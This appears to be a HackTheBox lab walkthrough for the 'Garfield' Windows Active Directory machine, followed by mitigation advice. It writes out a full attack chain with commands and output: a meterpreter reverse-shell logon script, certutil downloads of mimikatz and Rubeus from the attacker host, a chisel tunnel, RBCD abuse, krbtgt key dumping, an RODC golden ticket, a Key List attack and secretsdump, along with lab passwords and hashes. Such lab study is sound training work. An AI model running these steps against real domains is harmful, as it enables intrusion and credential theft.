<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Insane-red?style=for-the-badge" alt="Insane Difficulty" />
</p>

# Garfield Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.16.212
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-05 14:13 UTC
Nmap scan report for 10.129.16.212
Host is up (0.26s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-05 22:12:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T22:13:25+00:00
|_ssl-date: 2026-04-05T22:14:05+00:00; +7h59m30s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
...
```

> — Okay Our favorite AD!!
> — They also provided a username and password to begin with ---> j.arbuckle / Th1sD4mnC4t!@1978
> — Lets look for SMB verification!

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
```

> — granted! well as expected
> — Lets list users

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.16.212   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
...
SMB         10.129.16.212   445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller
SMB         10.129.16.212   445    DC01             j.arbuckle                    2025-09-09 15:50:55 0
SMB         10.129.16.212   445    DC01             l.wilson                      2026-01-27 21:40:33 0
SMB         10.129.16.212   445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0
```

> — l.wilson and l.wilson_adm, interesting!
> — Lets look at some shares as well!

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```

```text
SMB         10.129.16.212   445    DC01             Share           Permissions     Remark
SMB         10.129.16.212   445    DC01             -----           -----------     ------
SMB         10.129.16.212   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.212   445    DC01             C$                              Default share
SMB         10.129.16.212   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.212   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.16.212   445    DC01             SYSVOL          READ            Logon server share
```

> — we got some read Privileges for IPC%, NETLOGON, and SYSVOL
> — i looked at these Shares, but i don't think there is something to check on

```bash
smbclient //10.129.16.212/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
```

```text
...
\garfield.htb\scripts
  .                                   D        0  Tue Jan 27 22:13:47 2026
  ..                                  D        0  Tue Jan 27 22:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 22:20:29 2025
...
```

> — while looking at the printDetect.bat file, i have found that, windows has a shared access of \garfield.htb\scripts, means all the users inside the domain group can access this share.
> — Now what i have learnt is, that every user has a logon script, means it is a script that runs whenever a user logs in.
> — if we can change, that printDetect.bat file and use something like change password for l.wilson, and then add it as a logon script for l.wilson, we can grant access to user l.wilson
> — Lets First check what are the writeables for the current user!

```bash
bloodyAD --host DC01.garfield.htb \
   -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
   get writable --detail
```

```text
...
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

> — The output confirms our above attack strategy, we have write privs over l.wilson's scriptPATH attribute.

* scriptPATH attribute is the one which has the logon script that runs as the user logs in, if we can write it means we can change it as well!

## Step 2 - Initial Foothold

> — first i have tried creating a Reverse shell payload for windows, but it didn't worked.
> — Then i knew that i have to encode it into base64 to be executed.
> — Lets use Metasploit here!
> — Lets first create a .bat file to be uploaded. will create it using Metasploit

```bash
printf '@echo off\r\n%s\r\n' \
   "$(msfvenom -p windows/x64/meterpreter/reverse_tcp \
   LHOST=10.10.15.**** LPORT=443 \
   -f psh-cmd | tail -n 1)" \
> log-check.bat
```

> — on the other hand turn on your Metasploit listener

```bash
sudo msfconsole -q \
   -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

> — Then lets just put this file into the share

```bash
smbclient //garfield.htb/SYSVOL \
   -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
   -c 'cd garfield.htb\scripts; put log-check.bat log-check.bat'
```

> — Change the path of l.wilson's logon script to our rev shell script

```bash
bloodyAD --host DC01.garfield.htb \
   -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
   set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
   scriptPath \
   -v log-check.bat
```

```text
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

> — On Listener!

```text
[*] Started reverse TCP handler on 10.10.15.****:443
[*] Sending stage (230982 bytes) to 10.129.17.250
[*] Meterpreter session 1 opened (10.10.15.****:443 -> 10.129.17.250:61591) at 2026-04-08 14:32:05 +0000

meterpreter > shell
Process 4640 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.8389]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
garfield\l.wilson
```

> — Okay so we got our foothold!
> — Now when i was enumerating bloodhound, i found out that the user l.wilson has ForceChangePassowrd rights on l.wilson_adm, so we can change the password!

```powershell
meterpreter > powershell_execute "$pw = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force; Set-ADAccountPassword -Identity 'l.wilson_adm' -Reset -NewPassword $pw"
```

> — now Lets confirm if the password has changed or not, and also lets check if this l.wilson_adm has winrm or not.

```bash
nxc winrm 10.129.31.77 -u l.wilson_adm -p 'NewPassword123!' -d garfield.htb
```

```text
WINRM       10.129.31.77    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
WINRM       10.129.31.77    5985   DC01             [+] garfield.htb\l.wilson_adm:NewPassword123! (Pwn3d!)
```

> — Good! as expected!
> — Lets Grab the shell!

```bash
evil-winrm -i 10.129.31.77  -u 'l.wilson_adm' -p 'NewPassword123!'
```

## Step 3 - Privilege Escalation

> — First thing i took was the bloodhound

```text
	l.wilson_adm
	     ↓
  WriteAccountRestrictions
	     ↓
    RODC garfield.htb

	l.wilson_adm
	     ↓
          MemberOf
	     ↓
     Tier1.garfield.htb
	     ↓
	  addSelf
	     ↓
  RODC Administrators@garfield.htb
```

* What is WriteAccountRestriction?:- Write Account Restrictions is a sensitive Active Directory (AD) permission allowing a user/group to modify critical security attributes on user or computer objects, specifically the userAccountControl attribute. This delegated right allows changing account status (e.g., enabling/disabling, unlocking) and is often required for helpdesk roles to manage passwords and account locks.

> — So this attribute is only allows us to play around some security attributes despite giving us some concrete pathway to escalate!
> — Now there is only one obvious pathway towards domain escalation, which is the second one
> — l.wilson_adm is member of  Tier1.garfield.htb and every member of this group has addSelf rights over the Administrator group.
> — Once we add the l.wilson_adm into Administrators OU then we can gain full control over the DC(RODC).

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Add-ADGroupMember -Identity "R0DC Administrators@garfield.htb" -Members "l.wilson_adm"
Cannot find an object with identity: 'R0DC Administrators@garfield.htb' under: 'DC=garfield,DC=htb'.
```

> — one thing we didn't get was this RODC thing
> — A Read-Only Domain Controller (RODC) is designed for branch or semi-trusted locations that still need directory services. It keeps a filtered copy of AD for LDAP queries, excluding sensitive attributes, and it can cache selected user and computer credentials locally through the Password Replication Policy (PRP) to support authentication.
> — means the administrator OU in which we were trying to add ourself is nothing but an RODC with filtered AD and LDAP queries, which excluded all the sensitive attributes, which is the main reason why addSelf didn't worked, and that makes a complete sense!

* The Basics in Simple Terms
  1. What is an RODC?
     Think of a Read-Only Domain Controller (RODC) as a "lite" version of a DC. It holds a copy of the Active Directory database but cannot make any changes. It’s like a library that only lets you read books but won't let you write new ones or edit existing ones.
  2. Credential Caching (The "Secret Storage")
     To save time, an RODC stores (caches) the passwords of users who log in to it frequently. However, it’s not allowed to store everyone's password (like Domain Admins) because if the RODC is stolen, those high-value passwords would be exposed.
     msDS-RevealOnDemandGroup: This is the "Allow List." Any user in this list can have their password stored on the RODC.
     msDS-NeverRevealGroup: This is the "Deny List." Even if you are on the allow list, if you are here (like the Administrator account), the RODC will never store your password.
  3. The RODC krbtgt (The "Special Key")
     Standard DCs use a master key (krbtgt) to sign login tickets. Because the RODC isn't fully trusted, it gets its own unique, secondary key (e.g., krbtgt_12345). If you steal this key, you can forge tickets only for that specific RODC.

> — while enumerating i found out that there is a second internal host as well!

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> ipconfig
```

```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
Ethernet adapter Ethernet0 3:
   IPv4 Address. . . . . . . . . . . : 10.129.31.77
```

> — This makes complete sense why our previous AddSelf queries were failed and showed "Object Not Found"
> — Scan shows the same AD environment

```powershell
*Evil-WinRM* PS C:\temp> .\fscan.exe -h 192.168.100.0/24
```

```text
[*] NetInfo
[*]192.168.100.1
   [->]DC01
[*] NetBios 192.168.100.2   [+] DC:GARFIELD\RODC01
[*] NetInfo
[*]192.168.100.2
   [->]RODC01
```

> — I think we should tunnel it up in-order to perform those AD and LDAP queries on this internal host!
> — Start Listener on kali with

```bash
./chisel-lin server --reverse --port 8080 --socks5
```

> — On windows

```powershell
.\chisel.exe client 10.10.14.****:8080 R:socks
```

> — now lets ensure the connection

```bash
proxychains crackmapexec smb 192.168.100.2
```

> — Connection Succeeded!
> — Lets get the evil-winrm Session now

```bash
proxychains4 evil-winrm -i 192.168.100.2  -u 'l.wilson_adm' -p 'NewPassword123!'
```

> — We are in!
> — Now first check Those Allowed and Denied Lists.

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Allowed
DistinguishedName : CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Denied
DistinguishedName : CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
DistinguishedName : CN=Administrators,CN=Builtin,DC=garfield,DC=htb
```

> — As Expected The CN=Administrators is in Denied list. so we need to remove it from the denied list and as well, add it to the allowed list
> — After Searching for a while, we have WriteAccountRestriction over RODC01, so we can use some of the attributes
> — But here's a catch l.wilson_adm is in Tier-01 OU, and to abuse WriteAccountRestrictions, we need Tier-0 level privileges. so now we can't directly use those security attributes from this group, we need to escalate
> — Since we are in Tier-01 and every member/Object of Tier-01 has addSelf privilges over Administrator(which is a Tier-0 OU). we can then use these  WriteAccountRestriction Privileges.

* Why addSelf to RODC01 Administrators first?
  Because WriteAccountRestrictions on RODC01 was granted to the RODC Administrators group, not directly to l.wilson_adm.

> — Okay lets Exploit now, by first adding l.wilson_adm to Administrator

```bash
proxychains bloodyAD -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' --host 192.168.100.1 add groupMember "RODC Administrators" "l.wilson_adm"
```

```text
[+] l.wilson_adm added to RODC Administrators
```

> — Now we need to use the msDS-AllowedToActOnBehalfOfOtherIdentity (the RBCD attribute). to Create a Fake object that will impersonate with Administrator

* Why are we Creating this Fake Account, while we can just use the WriteAccountRestriction Privileges?
  We are creating this new account to get a TGS for Administrator and then later on get a shell for Administrator of RODC. why? Normally DC uses krbtgt account to sign tickets, as RODC is a semi-DC it has its own Separate account to sing tickets something like krbtgt_1234
* Why we we need this krbtgt_1234 of RODC?
  it has a Signing key, that we will use later on to get a Golden ticket for administrator on DC01, and DC01 will return us its real krbtgt key material AES-256 encoded, which can later be used to forge the ticket for any User.

```text
krbtgt_8245 (RODC signing key)
    ↓ forge RODC Golden Ticket for Administrator
Forged TGT presented to DC01
    ↓ Key List Attack
DC01 returns real krbtgt AES256 key material
    ↓
Real krbtgt hash → forge tickets for ANY user on ANY machine
    ↓
Full Domain Compromise of DC01
```

> — So now that we are in RODC administrators lets abuse RBCD
> — Lets First create a new account

```bash
proxychains impacket-addcomputer garfield.htb/l.wilson_adm:'NewPassword123!' -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip 192.168.100.1
```

> — Now lets Set  msDS-AllowedToActOnBehalfOfOtherIdentity (the RBCD attribute)

```bash
proxychains impacket-rbcd garfield.htb/l.wilson_adm:'NewPassword123!' -dc-ip 192.168.100.1 -action write -delegate-to 'RODC01$' -delegate-from 'FAKEBOX$'
```

> — RBCD Abused!
> — Now that we can act ON behalf of any user, lets act as administrator!!

```bash
proxychains impacket-getST garfield.htb/FAKEBOX$:'FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 192.168.100.1
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

> — Ensure the TGS

```bash
klist
```

> — Lets get the shell!

```bash
proxychains impacket-wmiexec -k -no-pass garfield.htb/Administrator@RODC01.garfield.htb
```

```text
C:\>whoami
garfield\administrator
```

> — Now to Get the signing ticket for RODC krbtgt_1234 account, we need to use mimikatz that will extract all the info

```powershell
C:\> certutil -urlcache -f http://10.10.14.253:9500/mimikatz.exe mimikatz.exe
```

> — mimikatz is send!
> — Lets the Dump the signing key now

```powershell
C:\>.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

```text
 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240  #Key
```

> — We got the key!
> — Now Before asking for real krbtgt password hash from DC01, we need to add administrator of RODC to allowed list of key_list and need to also remove from denied list!
> — Lets first add the administrator in allowed list

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

> — Now Lets remove from denied list

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-NeverRevealGroup
```

> — Now we are on allowed list, means we can forge a golden ticket which will trick the DC01 to give us the signing key for real krbtgt, which we will use to compromise the full domain!
> — Lets send rubeus

```powershell
C:\>certutil -urlcache -f http://10.10.14.253:9500/Rubeus.exe Rubeus.exe
```

> — Rubeus is there, now lets forge a golden ticket with the signed key we got earlier

```powershell
C:\>.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
```

> — We got the golden ticket, now lets ask for real krbtgt password hash!
> — Now lets perform KeyList attack!

* Key List Attack — Simple Terms
  Think of it like this:
  Normal Kerberos: You → show TGT to DC → DC gives you a service ticket
  Key List Attack:
  You → show RODC Golden Ticket to DC01
      → DC01 thinks: "my RODC is asking for key sync"
      → DC01 hands back real krbtgt hash
* Why Does It Work?
  Microsoft built a feature called Key List so that RODCs can ask DC01: "Hey, what's the current password hash for this user?" This is a legitimate replication feature — RODCs need to stay in sync with DC01.
  We abuse it by:
  1. Forging a ticket that looks like it came from our RODC 					#The Golden Ticket we Forged with administrator from RODC
  2. Presenting it to DC01 as if we're the RODC asking for a sync					#KeyList Attack
  3. DC01 checks: "is Administrator allowed to be cached on this RODC?" → Yes (we added it)	#PRP Attributes
  4. DC01 hands over the real password hash							#The Base64 encoded, ticket hash

> — Lets perform the attack now !

```powershell
C:\temp>.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:administrator_2026_04_18_22_42_32_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
```

```text
  Base64(key)              :  QqrxnGt5pZWBmk35nSRdIHqrufjOo56E6W64DShxZDo=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

> — we got the base64 key hash!
> — Now we need to convert it in a .ccache format so we can use it to dump secrets.

```bash
# 1.Save:
echo -n 'BASE64_HERE' | tr -d ' \r\n\t' | base64 -d > ticket.kirbi

# 2.Convert:
ticketConverter.py ticket.kirbi ticket.ccache

# 3.export:
export KRB5CCNAME=ticket.ccache

# 4.Ensure
klist                            
```

> — Now That we have a valid TGS for Garfield Domain Admin, we can dump secrets (or you can directly get the winrm shell!)

```bash
proxychains impacket-secretsdump -k -no-pass DC01.garfield.htb
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
```

> — Lets grab the shell now!

```bash
evil-winrm -i 10.129.39.117 -u 'Administrator' -p 'lgoSWZnv0phWaNFu'
```

> — Domain Compromised!

## Mitigation & Security Perspective

> [!CAUTION]
> **SYSVOL Logon Script Abuse via Write Privileges**
> User `j.arbuckle` possessed unjustified `WRITE` permissions over the `scriptPath` attribute of multiple users (`l.wilson`, `l.wilson_adm`). An attacker leveraged this to map `l.wilson`'s logon script to a malicious reverse shell payload stored in a world-readable/writable SYSVOL directory.
> **Mitigation:** Revoke the ability of standard users to modify `scriptPath`, `userParameters`, or `profilePath` attributes. Enforce strict least-privilege delegation models in Active Directory. Store logon/startup scripts in highly secured directories where `Domain Users` have strict read-only access.

> [!CAUTION]
> **Privileged Group Membership & GenericAll/AddSelf Rights**
> `l.wilson` held `ForceChangePassword` rights over `l.wilson_adm`, allowing trivial account takeover. Furthermore, `l.wilson_adm` belonged to a Tier 1 group with `addSelf` rights to `RODC Administrators`, providing a direct path to escalate to RODC administrative control.
> **Mitigation:** Perform regular Active Directory ACL/ACE auditing (e.g., using BloodHound or PingCastle) to identify and eliminate dangerous permission chains such as `ForceChangePassword`, `GenericAll`, or `AddSelf` granted to non-administrative accounts. Implement a strict Tiered Administration Model (Tier 0, Tier 1, Tier 2) where lower-tier accounts cannot control higher-tier accounts or groups.

> [!CAUTION]
> **Resource-Based Constrained Delegation (RBCD) Abuse**
> Upon compromising the `RODC Administrators` group, the attacker used `WriteAccountRestrictions` to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the RODC computer account, executing an RBCD attack to impersonate the Domain Administrator and take full control over the RODC.
> **Mitigation:** Restrict the `WriteAccountRestrictions` permission to only strictly necessary Tier-0 administrative roles. Monitor for unauthorized modifications to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Consider disabling the `MachineAccountQuota` (set to 0) to prevent unprivileged users from joining arbitrary computer accounts to the domain, a common prerequisite for RBCD attacks.

> [!CAUTION]
> **RODC Key List Attack via PRP Modification**
> The attacker modified the Password Replication Policy (PRP) of the RODC by adding the Domain `Administrator` to the `msDS-RevealOnDemandGroup` and removing it from `msDS-NeverRevealGroup`. By extracting the RODC's `krbtgt_XXXX` key via Mimikatz, they forged a Golden Ticket to simulate a legitimate RODC password replication request (Key List Attack) against the primary Domain Controller, extracting the real Domain krbtgt and Administrator hashes.
> **Mitigation:** Strictly restrict modifications to the RODC's Password Replication Policies. Monitor Active Directory for changes to the `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` attributes. Furthermore, monitor Event ID 4692 (Backup of data protection master key was attempted) and anomalous Kerberos TGS-REQ (Key List) traffic originating from systems or accounts masquerading as Domain Controllers. Rotate the domain's KRBTGT password twice consecutively if a compromise is suspected.
